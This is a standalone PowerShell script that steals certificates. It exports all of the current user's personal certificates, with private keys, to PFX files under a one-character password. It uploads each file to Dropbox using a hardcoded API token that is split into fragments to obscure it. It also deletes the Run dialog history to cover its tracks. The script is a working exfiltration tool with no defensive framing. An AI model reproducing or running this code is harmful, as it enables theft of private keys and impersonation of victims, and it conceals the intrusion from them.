$ErrorActionPreference = "Continue"
trap{C:\Windows\System32\reg.exe delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f}
function send($f) {
    $TargetFilePath = "/c/$f"
    $SourceFilePath = "C:\ProgramData\cloudpath_data\found\$f"
    $token = "s"+"l"+".BvNnPN"+"Ctt_urEyXKweM9443Gg"+"PhuVt7joQMrd6L9hazZwol4H8o"+"PKIAVRVxp-UC4zW"+"zfXC2qqyeP5lL"+"evgaS1"+"37W6oLMXKcVpS5sPU"+"69YD0QF7CNedBq"+"uxnxG0DoHqUrI1"+"6s-EJqpHF9"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $token
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    irm -useb -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

C:
cd C:\ProgramData\cloudpath_data\
mkdir found
cd found
$p = ConvertTo-SecureString -String '.' -Force -AsPlainText
gci Cert:\CurrentUser\My\|%{try{Export-PfxCertificate $_ "C:\ProgramData\cloudpath_data\found\$($_.Thumbprint)" -Password $p}catch{}}
gci C:\ProgramData\cloudpath_data\found\|%{echo $_.Name; send $_.Name}
